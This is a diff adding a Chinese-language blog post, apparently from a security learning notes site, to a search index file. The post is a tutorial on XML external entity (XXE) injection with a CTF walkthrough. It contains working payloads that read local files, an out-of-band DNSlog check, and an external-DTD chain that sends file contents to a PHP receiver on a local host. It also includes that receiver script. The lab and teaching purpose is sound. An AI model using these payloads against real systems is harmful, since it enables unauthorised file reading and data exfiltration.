@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>WEB攻防-通用漏洞-XML、XXE及绕过</title>
+      <link href="/post/f35f0db.html"/>
+      <url>/post/f35f0db.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="XXE是什么？"><a href="#XXE是什么？" class="headerlink" title="XXE是什么？"></a>XXE是什么？</h1><p>XML作为一种常用于Web应用程序的数据格式。XML文档可以定义实体，它们是存储文档中其他地方重复使用的数据的方式。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><p>XXE（XML外部实体注入）是一种针对应用程序处理XML数据的方式的攻击，在这种攻击中，攻击者利用应用程序对XML输入的处理不当，引入恶意内容，可能导致未授权的数据访问、服务拒绝攻击甚至远程代码执行。</p><p>XXE漏洞发生在应用程序解析XML输入的时候，没有禁止外部实体的加载，导致可能加载恶意外部程序，进而引发各种危害</p><h1 id="判定XML传输"><a href="#判定XML传输" class="headerlink" title="判定XML传输"></a>判定XML传输</h1><p>对于这个漏洞，最重要的是要判断是否使用了XML进行数据的传输，我们可以通过以下两个特征来进行判断，我们抓取数据提交的数据包，查看<code>Accept</code>和<code>X-Requested-With</code>，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814105724662.png" alt="image-20240814105724662"></p><p>当出现<code>application/xml</code>以及<code>XMLHttpRequest</code>的时候我们就可以判断其使用了XML进行了数据传输，这个时候我们就可以测试一下是否存在XXE漏洞</p><h1 id="XXE读取文件"><a href="#XXE读取文件" class="headerlink" title="XXE读取文件"></a>XXE读取文件</h1><p>相关payload如下所示：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">Mikasa</span> [<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/e.txt&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>Mikasa<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110417373.png" alt="image-20240814110417373"></p><p>我们可以成功读取到相关的文件</p><h1 id="XXE带外测试"><a href="#XXE带外测试" class="headerlink" title="XXE带外测试"></a>XXE带外测试</h1><p>当对方关闭了回显的时候，即注释掉下面的两行代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110624139.png" alt="image-20240814110624139"></p><p>这个时候我们无论发送什么，都不会有相关的回显</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814110949750.png" alt="image-20240814110949750"></p><p>这个时候我们如何去判断有没有XXE漏洞呢？这个时候就要使用DNSlog外带技术进行带外测试，我们将地址换成dnslog的地址，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814155845194.png" alt="image-20240814155845194"></p><p>点击发送后，我们刷新dnslog的记录，看看是否刷新了相关访问记录</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814160003566.png" alt="image-20240814160003566"></p><p>出现这种情况，我们可以判断存在XXE漏洞，只是没有对应的输出信息</p><h1 id="XXE实体引用"><a href="#XXE实体引用" class="headerlink" title="XXE实体引用"></a>XXE实体引用</h1><p>带外只能判断漏洞是否存在，如果漏洞存在，那么我们该如何进行利用呢？这个时候我们就需要用到DTD文件，通过DTD文件帮助我们将对应的文件信息发送出去</p><p>我们的XML信息填写如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/www.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8081/web/php_xxe/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd文件如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://127.0.0.1:8081/web/get1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>我们的get1.php如下所示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;file.txt&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们发送后，其会调用我们外部的dtd文件，然后实现自动发送，我们使用get1.php文件进行接收对应的参数，并保存为文件</p><p>更多玩法参考这篇文章：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE - MustaphaMond - 博客园 (cnblogs.com)</a></p><h1 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h1><p>我们以nssctf上的exx为例子，这个题目一看就是要我们使用xxe漏洞进行攻击</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814163509330.png" alt="image-20240814163509330"></p><p>我们首先先随便用一个账号密码登录，然后抓包看看什么情况</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814163626241.png" alt="image-20240814163626241"></p><p>更加确定我们这里存在XXE漏洞了，我们这里直接读取flag试试</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>发送后我们直接读到flag</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240814164218948.png" alt="image-20240814164218948"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络攻防 </category>
+          
+          <category> WEB攻防 </category>
+          
+          <category> XXE攻击 </category>
+          
+          <category> 笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XXE </tag>
+            
+            <tag> XML </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>WEB攻防-通用漏洞-CSRF、SSRF漏洞利用</title>
       <link href="/post/b19495c8.html"/>
       <url>/post/b19495c8.html</url>
